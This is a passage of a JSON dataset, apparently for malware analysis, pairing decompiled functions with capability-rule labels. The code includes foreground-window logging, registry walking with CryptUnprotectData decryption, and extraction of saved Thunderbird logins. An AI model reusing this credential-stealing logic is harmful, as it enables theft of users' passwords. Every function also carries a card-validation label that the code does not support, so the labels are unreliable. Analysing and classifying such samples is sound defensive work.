uVar8 = uVar20 ^ uVar14 ^ uVar13 ^ uVar17;\n    uVar8 = uVar8 << 1 | uVar8 < 0;\n    uVar22 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar3 = (uVar2 * 0x20 | uVar2 >> 0x1b) + 0xca62c1d6 + (uVar23 ^ uVar10 ^ uVar1) + uVar8 + uVar15;\n    uVar1 = uVar9 ^ uVar12 ^ uVar21 ^ uVar18;\n    uVar1 = uVar1 << 1 | uVar1 < 0;\n    uVar9 = (uVar3 * 0x20 | uVar3 >> 0x1b) + 0xca62c1d6 + (uVar2 ^ uVar10 ^ uVar22) + uVar1 + uVar23;\n    uVar15 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar20 ^ uVar7 ^ uVar24 ^ uVar19;\n    uVar2 = uVar2 << 1 | uVar2 < 0;\n    uVar25 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar14 = (uVar9 * 0x20 | uVar9 >> 0x1b) + (uVar15 ^ uVar3 ^ uVar22) + 0xca62c1d6 + uVar2 + uVar10;\n    uVar18 = uVar8 ^ uVar11 ^ uVar4 ^ uVar18;\n    uVar3 = uVar18 << 1 | uVar18 < 0;\n    uVar20 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar9 = (uVar14 * 0x20 | uVar14 >> 0x1b) + (uVar15 ^ uVar25 ^ uVar9) + uVar3 + uVar22 + 0xca62c1d6;\n    uVar19 = uVar1 ^ uVar5 ^ uVar16 ^ uVar19;\n    uVar22 = uVar19 << 1 | uVar19 < 0;\n    uVar10 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar14 = (uVar9 * 0x20 | uVar9 >> 0x1b) + (uVar25 ^ uVar20 ^ uVar14) + uVar22 + uVar15 + 0xca62c1d6;\n    uVar4 = uVar2 ^ uVar13 ^ uVar6 ^ uVar4;\n    uVar18 = uVar4 << 1 | uVar4 < 0;\n    uVar23 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar9 = (uVar14 * 0x20 | uVar14 >> 0x1b) + (uVar20 ^ uVar10 ^ uVar9) + uVar18 + uVar25 + 0xca62c1d6;\n    uVar19 = uVar12 ^ uVar17 ^ uVar16 ^ uVar3;\n    uVar19 = uVar19 << 1 | uVar19 < 0;\n    uVar25 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar20 = (uVar9 * 0x20 | uVar9 >> 0x1b) + (uVar14 ^ uVar10 ^ uVar23) + 0xca62c1d6 + uVar19 + uVar20;\n    uVar4 = uVar7 ^ uVar21 ^ uVar6 ^ uVar22;\n    uVar4 = uVar4 << 1 | uVar4 < 0;\n    uVar15 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar14 = (uVar25 ^ uVar9 ^ uVar23) + uVar4 + uVar10 + 0xca62c1d6 + (uVar20 * 0x20 | uVar20 >> 0x1b);\n    uVar9 = uVar8 ^ uVar24 ^ uVar17 ^ uVar18;\n    uVar17 = uVar9 << 1 | uVar9 < 0;\n    uVar16 = uVar20 >> 2 | uVar20 * 0x40000000;\n    uVar10 = uVar23 + 0xca62c1d6 + (uVar25 ^ uVar15 ^ uVar20) + uVar17 + (uVar14 * 0x20 | uVar14 >> 0x1b);\n    uVar9 = uVar1 ^ uVar11 ^ uVar21 ^ uVar19;\n    uVar9 = uVar9 << 1 | uVar9 < 0;\n    uVar20 = (uVar15 ^ uVar16 ^ uVar14) + uVar9 + uVar25 + 0xca62c1d6 + (uVar10 * 0x20 | uVar10 >> 0x1b);\n    uVar21 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar14 = uVar2 ^ uVar5 ^ uVar24 ^ uVar4;\n    uVar6 = uVar14 << 1 | uVar14 < 0;\n    uVar23 = uVar10 >> 2 | uVar10 * 0x40000000;\n    uVar14 = (uVar16 ^ uVar21 ^ uVar10) + uVar6 + uVar15 + (uVar20 * 0x20 | uVar20 >> 0x1b) + 0xca62c1d6;\n    uVar10 = uVar13 ^ uVar11 ^ uVar17 ^ uVar3;\n    uVar11 = uVar12 ^ uVar5 ^ uVar9 ^ uVar22;\n    uVar10 = uVar10 << 1 | uVar10 < 0;\n    uVar5 = uVar11 << 1 | uVar11 < 0;\n    uVar16 = (uVar20 ^ uVar21 ^ uVar23) + uVar10 + uVar16 + 0xca62c1d6 + (uVar14 * 0x20 | uVar14 >> 0x1b);\n    uVar20 = uVar20 >> 2 | uVar20 * 0x40000000;\n    uVar11 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar18 = uVar7 ^ uVar13 ^ uVar6 ^ uVar18;\n    uVar13 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar15 = uVar21 + 0xca62c1d6 + (uVar20 ^ uVar14 ^ uVar23) + uVar5 + (uVar16 * 0x20 | uVar16 >> 0x1b);\n    uVar14 = uVar18 << 1 | uVar18 < 0;\n    uVar19 = uVar8 ^ uVar12 ^ uVar10 ^ uVar19;\n    uVar12 = (uVar20 ^ uVar11 ^ uVar16) + 0xca62c1d6 + uVar14 + uVar23 + (uVar15 * 0x20 | uVar15 >> 0x1b);\n    uVar19 = uVar19 << 1 | uVar19 < 0;\n    uVar16 = uVar15 >> 2 | uVar15 * 0x40000000;\n    uVar18 = (uVar11 ^ uVar13 ^ uVar15) + uVar19 + uVar20 + (uVar12 * 0x20 | uVar12 >> 0x1b) + 0xca62c1d6;\n    uVar4 = uVar1 ^ uVar7 ^ uVar5 ^ uVar4;\n    uVar4 = uVar4 << 1 | uVar4 < 0;\n    uVar7 = (uVar18 * 0x20 | uVar18 >> 0x1b) + (uVar13 ^ uVar16 ^ uVar12) + 0xca62c1d6 + uVar4 + uVar11;\n    uVar12 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar17 = uVar2 ^ uVar8 ^ uVar14 ^ uVar17;\n    uVar3 = uVar1 ^ uVar19 ^ uVar9 ^ uVar3;\n    uVar1 = (uVar12 ^ uVar18 ^ uVar16) + 0xca62c1d6 + uVar13 +\n            (uVar17 << 1 | uVar17 < 0) + (uVar7 * 0x20 | uVar7 >> 0x1b);\n    uVar13 = uVar18 >> 2 | uVar18 * 0x40000000;\n    uVar22 = uVar2 ^ uVar4 ^ uVar6 ^ uVar22;\n    uVar8 = (uVar3 << 1 | uVar3 < 0) + (uVar1 * 0x20 | uVar1 >> 0x1b) + (uVar13 ^ uVar7 ^ uVar12) + 0xca62c1d6 + uVar16;\n    uVar7 = uVar7 >> 2 | uVar7 * 0x40000000;\n    var_5ch[2] = var_5ch[2] + (uVar1 >> 2 | uVar1 * 0x40000000);\n    var_5ch[3] = var_5ch[3] + uVar7;\n    var_5ch[1] = var_5ch[1] + uVar8;\n    var_5ch[4] = var_5ch[4] + uVar13;\n    *var_5ch = (uVar13 ^ uVar7 ^ uVar1) + *var_5ch +\n               (uVar8 * 0x20 | uVar8 >> 0x1b) + 0xca62c1d6 + (uVar22 << 1 | uVar22 < 0) + uVar12;\n    return;\n}\n",
        "token_count": 10798
    },
    "00087966": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write file on Windows",
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.00087966(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint lpString;\n    uint var_ch;\n    uint var_8h;\n    uint lpString2;\n    \n    fcn.00081052(&lpString, 0, 0x208);\n    lpString2 = 0;\n    uVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    iVar5 = (*_sym.imp.USER32.dll_GetWindowTextW)(uVar4, &lpString, 0x104);\n    if (iVar5 < 1) {\n        fcn.000830c5(0x927d0);\n    }\n    else {\n        uVar4 = fcn.000833ab(&lpString);\n        fcn.00083230(0x927c8);\n        fcn.000830fb(uVar4);\n        fcn.00083230(0x927cc);\n        fcn.000858fb();\n        var_8h = 0;\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_lstrlenW;\n    iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*0x966ac + 0x210);\n    if (iVar5 != 0) {\n        uVar4 = fcn.000833ab(*0x966ac + 0x210);\n        iVar6 = fcn.0008300e(uVar4);\n        fcn.000858fb();\n        iVar5 = *0x966ac;\n        var_8h = 0;\n        if (iVar6 != 0) {\n            *(*0x966ac + 0xa10) = 1;\n            goto code_r0x00087a69;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x966ac + 0x210, lpString2);\n    iVar5 = *0x966ac;\n    *(*0x966ac + 0xa10) = 0;\ncode_r0x00087a69:\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(iVar5 + 0xc), 4, 1, 0, 4, 0x80, 0);\n    iVar5 = *0x966ac;\n    pcVar2 = _sym.imp.KERNEL32.dll_WriteFile;\n    piVar1 = *0x966ac + 0xa10;\n    *(*0x966ac + 4) = uVar4;\n    if (*piVar1 == 0) {\n        uVar4 = (*pcVar3)(600000, iVar5 + 8, 0);\n        (*pcVar2)(*(*0x966ac + 4), 600000, uVar4);\n        uVar4 = lpString2;\n        iVar5 = fcn.00083027(*0x966ac + 8, 0);\n        (*pcVar2)(*(*0x966ac + 4), uVar4, iVar5 * 2);\n        uVar4 = (*pcVar3)(600000, *0x966ac + 8, 0);\n        (*pcVar2)(*(*0x966ac + 4), 600000, uVar4);\n        iVar5 = *0x966ac;\n    }\n    iVar5 = (*pcVar3)(var_ch, iVar5 + 8, 0);\n    (*pcVar2)(*(*0x966ac + 4), var_ch, iVar5 * 2);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(*(*0x966ac + 4));\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 821
    },
    "000889d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.000889d8(int32_t *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    uVar1 = *param_2;\n    iVar4 = *param_1;\n    iVar5 = 0;\n    iVar3 = fcn.00082e52();\n    pcVar2 = _sym.imp.SHLWAPI.dll_StrStrA;\n    while( true ) {\n        iVar4 = (*pcVar2)(iVar4, uVar1);\n        if (iVar4 == 0) break;\n        iVar5 = iVar5 + 1;\n        iVar4 = iVar3 + 4 + iVar4;\n    }\n    return iVar5;\n}\n",
        "token_count": 189
    },
    "00088a11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00088a11(uint *arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint in_ECX;\n    int32_t *in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00082e52();\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrA;\n    iVar3 = *in_EDX;\n    uVar4 = *arg_8h;\n    do {\n        iVar3 = (*pcVar1)(iVar3, uVar4);\n        iVar3 = iVar2 + 3 + iVar3;\n        arg_ch = arg_ch + -1;\n    } while (arg_ch != 0);\n    iVar2 = (*pcVar1)(iVar3, 0x934fc);\n    uVar4 = fcn.00085878();\n    fcn.00085985(iVar2 - iVar3);\n    fcn.00083185(uVar4);\n    fcn.000858fb();\n    return in_ECX;\n}\n",
        "token_count": 253
    },
    "00088ad4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00088ad4(uint arg_8h)\n\n{\n    fcn.00082c65(&arg_8h);\n    fcn.00082dff();\n    return;\n}\n",
        "token_count": 44
    },
    "00088bf6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: hKey\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.00088bf6(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint32_t uVar4;\n    uint32_t unaff_EDI;\n    uint var_1010h;\n    uint uStackY208;\n    uint uStackY204;\n    uint *puStackY200;\n    uint uStackY196;\n    uint uStackY192;\n    uint *puStackY188;\n    uint uStackY184;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    hKey = 0x88c03;\n    fcn.00081130();\n    uVar4 = 0;\n    hKey = unaff_EBX;\n    fcn.00081052();\n    fcn.00081052();\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegOpenKeyExW;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)();\n    if ((((iVar3 == 0) || (iVar3 = (*pcVar1)(),  iVar3 == 0)) || (iVar3 = (*pcVar1)(),  iVar3 == 0)) ||\n       (iVar3 = (*pcVar1)(),  iVar3 == 0)) {\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrcpyW;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryInfoKeyW)();\n        if (iVar3 == 0) {\n            if (unaff_EDI != 0) {\n                do {\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyExW)();\n                    if (iVar3 != 0) {\n                        return 0;\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                    (*pcVar2)();\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n                    iVar3 = (*pcVar1)();\n                    if (iVar3 != 0) {\n                        return 0;\n                    }\n                    uStackY184 = 0x88d7c;\n                    fcn.00088db8(hKey);\n                    uStackY184 = hKey;\n                    puStackY188 = 0x88d85;\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                    puStackY188 = &fcn.00088bf6::hKey;\n                    uStackY192 = 0xf003f;\n                    uStackY196 = 0;\n                    puStackY200 = &fcn.00088bf6::var_1010h;\n                    uStackY204 = 0x80000001;\n                    uStackY208 = 0x88d9e;\n                    iVar3 = (*pcVar1)();\n                    if (iVar3 != 0) {\n                        return 0;\n                    }\n                    uVar4 = uVar4 + 1;\n                } while (uVar4 < unaff_EDI);\n            }\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 737
    },
    "00088db8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00088db8(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar auStackY17204 [8192];\n    uchar auStackY9012 [8192];\n    uint var_330h;\n    uint var_228h;\n    uint var_120h;\n    uint uStackY256;\n    uint *arg_8h_00;\n    uchar *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x88dc5;\n    fcn.00081130();\n    var_4h = 0x1000;\n    var_10h = NULL;\n    var_14h = NULL;\n    var_ch = 0;\n    fcn.00081052();\n    fcn.00081052();\n    fcn.00081052();\n    fcn.00081052();\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExW;\n    var_10h = &fcn.00088db8::var_4h;\n    var_14h = &stack0xffffdccc;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)();\n    if (iVar2 == 0) {\n        fcn.000830c5(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00081052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.000830c5(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00081052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.000830c5(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00081052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.000830c5(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00081052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.000830c5(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00081052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00081052();\n        fcn.00089150(var_4h);\n        fcn.000830c5(&stack0xffffbccc);\n    }\n    var_4h = 0x1000;\n    fcn.00081052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00081052();\n        fcn.00089150(var_4h);\n        fcn.000830c5(&stack0xffffbccc);\n    }\n    var_4h = 0x1000;\n    fcn.00081052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00081052();\n        fcn.00089150(var_4h);\n        fcn.000830c5(&stack0xffffbccc);\n    }\n    var_4h = 0x1000;\n    fcn.00081052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00081052();\n        fcn.00089150(var_4h);\n        fcn.000830c5(&stack0xffffbccc);\n    }\n    var_8h = 3;\n    iVar2 = fcn.00083027();\n    if (0 < iVar2) {\n        arg_8h_00 = &fcn.00088db8::var_14h;\n        uStackY256 = 0x89137;\n        fcn.00081ed8(arg_8h_00);\n        uStackY256 = 0x8913e;\n        fcn.00081f0e(arg_8h_00);\n    }\n    fcn.0008138f();\n    return 1;\n}\n",
        "token_count": 1010
    },
    "00089150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: pDataIn\n\nvoid __cdecl fcn.00089150(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    int32_t extraout_ECX;\n    uint16_t *puVar2;\n    uint extraout_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    char16_t acStack8216 [4076];\n    uint uStack64;\n    uint uStack60;\n    char16_t *pcStack56;\n    uint *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint pDataOut;\n    int32_t var_10h;\n    int32_t pDataIn;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0x8915d;\n    fcn.00081130();\n    var_10h = arg_8h + -1;\n    pDataOut = 0x40;\n    puStack28 = 0x89174;\n    var_4h = extraout_ECX;\n    var_8h = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n    iVar3 = 1;\n    if (1 < arg_8h) {\n        do {\n            *(var_8h + -1 + iVar3) = *(iVar3 + var_4h);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    pDataIn = arg_8h + -1;\n    iVar4 = 0;\n    puStack28 = &fcn.00089150::pDataOut;\n    uStack32 = 0;\n    uStack36 = 0;\n    uStack40 = 0;\n    uStack44 = 0;\n    uStack48 = 0;\n    puStack52 = &fcn.00089150::pDataIn;\n    pcStack56 = 0x891aa;\n    iVar3 = (*_sym.imp.CRYPT32.dll_CryptUnprotectData)();\n    if (iVar3 == 0) {\n        pcStack56 = L\"Could not decrypt\";\n    }\n    else {\n        if (0 < arg_8h) {\n            puVar2 = &stack0xffffdfe8;\n            do {\n                puVar1 = var_10h + iVar4;\n                iVar4 = iVar4 + 2;\n                *puVar2 = *puVar1;\n                puVar2 = puVar2 + 1;\n            } while (iVar4 < arg_8h);\n        }\n        pcStack56 = &stack0xffffdfe8;\n    }\n    uStack64 = 0x891e1;\n    uStack60 = extraout_EDX;\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n    return;\n}\n",
        "token_count": 666
    },
    "000891e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "check if file exists",
            "read .ini file",
            "copy file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000891e6(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uint uVar7;\n    uint uVar8;\n    uint var_4c4h;\n    uint lpApplicationName;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_a0h;\n    uint var_9ch;\n    uint lpBinaryType;\n    int32_t var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpExistingFileName;\n    uint lpNewFileName;\n    uint var_8h;\n    \n    var_1ch = in_ECX;\n    fcn.000833ab(L\"Profile\");\n    uVar4 = 0;\n    fcn.00081052(&var_4c4h, 0, 0x208);\n    var_34h = 0;\n    lpBinaryType = 0;\n    fcn.00081052(&lpApplicationName, 0, 0x104);\n    fcn.0008abe2();\n    fcn.000833ab(&lpApplicationName);\n    (*_sym.imp.KERNEL32.dll_GetBinaryTypeW)(&lpApplicationName, &lpBinaryType);\n    puVar5 = &var_28h;\n    fcn.000833f3(puVar5);\n    iVar1 = fcn.0008a190(puVar5);\n    if (iVar1 == 0) {\n        puVar5 = &var_28h;\n        fcn.000833f3(puVar5);\n        iVar1 = fcn.0008a190(puVar5);\n        if (iVar1 == 0) goto code_r0x00089702;\n    }\n    fcn.00083230(L\"\\\\Thunderbird\\\\\");\n    fcn.000833f3(&arg_8h);\n    fcn.00083230(L\"profiles.ini\");\n    uVar4 = fcn.000833ab(L\"Profile\");\n    fcn.000831fd(uVar4);\n    fcn.000858fb();\n    fcn.00083038(0);\n    while (iVar1 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)(var_14h, L\"Path\", 0, &var_4c4h, 0x104, var_20h), \n          iVar1 != 0) {\n        iVar1 = var_34h + 1;\n        var_34h = iVar1;\n        uVar4 = fcn.000833ab(L\"Profile\");\n        fcn.000831fd(uVar4);\n        fcn.000858fb();\n        var_38h = 0;\n        fcn.00083038(iVar1);\n        fcn.000833f3(&arg_8h);\n        fcn.00083230(&var_4c4h);\n        fcn.0008331a(&var_18h);\n        iVar1 = (**(in_ECX + 0x60))(var_18h);\n        if (((iVar1 == 0) && (var_94h = (**(in_ECX + 0x78))(),  var_94h != 0)) &&\n           (iVar1 = (**(in_ECX + 0x74))(var_94h, 1, 0),  iVar1 == 0)) {\n            fcn.000833f3(&var_8h);\n            fcn.00083230(L\"\\\\logins.json\");\n            fcn.0008d51c();\n            fcn.00083230(0x92464);\n            uVar4 = fcn.0008326d();\n            fcn.000830fb(uVar4);\n            fcn.000858fb();\n            var_3ch = 0;\n            fcn.00083230(L\".tmp\");\n            uVar4 = lpNewFileName;\n            iVar1 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, lpNewFileName, 0);\n            if (iVar1 != 0) {\n                fcn.000831fd(&lpNewFileName);\n            }\n            fcn.0008d9f6();\n            fcn.000831fd(&lpExistingFileName);\n            uVar7 = 0xc0000000;\n            uVar8 = extraout_ECX;\n            iVar1 = fcn.0008dcba(0xc0000000);\n            if (iVar1 != 0) {\n                var_30h = 0;\n                var_2ch = 0;\n                fcn.0008d965(&var_30h, var_a0h, 0);\n                fcn.00083185(\"encryptedUsername\");\n                fcn.00082cf2(&var_9ch);\n                iVar2 = fcn.000889d8();\n                var_68h = iVar2;\n                fcn.000858fb();\n                fcn.000858fb();\n                iVar1 = var_68h;\n                while (iVar2 != 0) {\n                    pcVar6 = \"hostname\";\n                    var_60h = 0;\n                    var_5ch = 0;\n                    var_58h = 0;\n                    iVar2 = iVar1;\n                    uVar4 = fcn.00083185(\"hostname\");\n                    puVar5 = &var_6ch;\n                    fcn.00082cf2(puVar5);\n                    fcn.00088a11(puVar5, uVar4);\n                    fcn.000858fb(pcVar6, iVar2);\n                    fcn.000858fb();\n                    pcVar6 = \"encryptedUsername\";\n                    iVar2 = iVar1;\n                    uVar4 = fcn.00083185(\"encryptedUsername\");\n                    puVar5 = &var_74h;\n                    fcn.00082cf2(puVar5);\n                    fcn.00088a11(puVar5, uVar4);\n                    fcn.000858fb(pcVar6, iVar2);\n                    fcn.000858fb();\n                    pcVar6 = \"encryptedPassword\";\n                    iVar2 = iVar1;\n                    uVar4 = fcn.00083185(\"encryptedPassword\");\n                    puVar5 = &var_7ch;\n                    fcn.00082cf2(puVar5);\n                    fcn.00088a11(puVar5, uVar4);\n                    fcn.000858fb(pcVar6, iVar2);\n                    fcn.000858fb();\n                    fcn.00089c70(var_50h, &var_84h);\n                    fcn.00089c70(var_4ch, &var_8ch);\n                    uVar4 = fcn.00082e63(&var_40h);\n                    fcn.000831fd(uVar4);\n                    fcn.000858fb();\n                    puVar5 = &var_44h;\n                    var_40h = 0;\n                    uVar4 = var_84h;\n                    fcn.00083185(var_84h);\n                    uVar3 = fcn.00082e63(uVar4);\n                    fcn.000831fd(uVar3);\n                    fcn.000858fb(uVar3, uVar4, puVar5);\n                    var_44h = 0;\n                    fcn.000858fb();\n                    puVar5 = &var_48h;\n                    uVar4 = var_8ch;\n                    fcn.00083185(var_8ch);\n                    uVar3 = fcn.00082e63(uVar4);\n                    fcn.000831fd(uVar3);\n                    fcn.000858fb(uVar3, uVar4, puVar5);\n                    var_48h = 0;\n                    fcn.000858fb();\n                    var_54h = 4;\n                    puVar5 = &var_60h;\n                    fcn.00081ed8(puVar5);\n                    fcn.00081f0e(puVar5);\n                    fcn.000858fb();\n                    fcn.000858fb();\n                    fcn.000858fb();\n                    fcn.0008138f();\n                    iVar1 = iVar1 + -1;\n                    uVar4 = lpNewFileName;\n                    iVar2 = iVar1;\n                }\n                iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(uVar4);\n                if (iVar1 != 0) {\n                    puVar5 = &lpNewFileName;\n                    fcn.000833f3(puVar5);\n                    fcn.0008da33(puVar5);\n                }\n                (**(var_1ch + 0x7c))(var_94h);\n                (**(var_1ch + 100))();\n                fcn.00082dff();\n            }\n            fcn.0008da15(uVar7, uVar8);\n            fcn.000858fb();\n            lpNewFileName = 0;\n            fcn.000858fb();\n            lpExistingFileName = 0;\n            fcn.000858fb();\n            fcn.000858fb();\n            in_ECX = var_1ch;\n        }\n        else {\n            fcn.000858fb();\n            fcn.000858fb();\n        }\n        var_8h = 0;\n    }\n    fcn.0008a139();\n    uVar4 = 1;\n    fcn.000858fb();\ncode_r0x00089702:\n    fcn.000858fb();\n    fcn.000858fb();\n    fcn.000858fb();\n    return uVar4;\n}\n",
        "token_count": 2322
    },
    "00089c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "decode data using Base64 via WinAPI",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: pcbBinary\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: lpString2\n\nvoid __cdecl fcn.00089c70(uint pszString, uint *arg_ch)\n\n{\n    int32_t extraout_ECX;\n    uint pbBinary;\n    uint uStack64;\n    uint *puStack60;\n    uint *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint *var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    uint pcbBinary;\n    \n    pcbBinary = 0x89c7d;\n    fcn.00081130();\n    var_10h = pszString;\n    pcbBinary = 0x1fa0;\n    var_14h = 0x89c93;\n    uStack44 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    var_14h = 0x1fa0;\n    var_1ch = &fcn.00089c70::pbBinary;\n    var_18h = NULL;\n    puStack36 = 0x89ca5;\n    fcn.00081052();\n    var_1ch = &fcn.00089c70::pcbBinary;\n    var_14h = 0;\n    var_18h = NULL;\n    puStack36 = &fcn.00089c70::pbBinary;\n    uStack40 = 1;\n    uStack48 = pszString;\n    iStack52 = 0x89cc1;\n    (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)();\n    var_18h = &fcn.00089c70::pbBinary;\n    var_1ch = NULL;\n    var_14h = pcbBinary;\n    puStack56 = &fcn.00089c70::var_10h;\n    iStack52 = 0;\n    puStack60 = &fcn.00089c70::var_1ch;\n    lpString2 = 0;\n    var_8h = 0;\n    var_10h = 0;\n    uStack64 = 0x89ce8;\n    (**(extraout_ECX + 0x68))();\n    *(var_8h + lpString2) = 0;\n    iStack52 = 0x89cff;\n    puStack56 = fcn.0008590a();\n    iStack52 = lpString2;\n    *arg_ch = puStack56;\n    puStack60 = 0x89d0e;\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)();\n    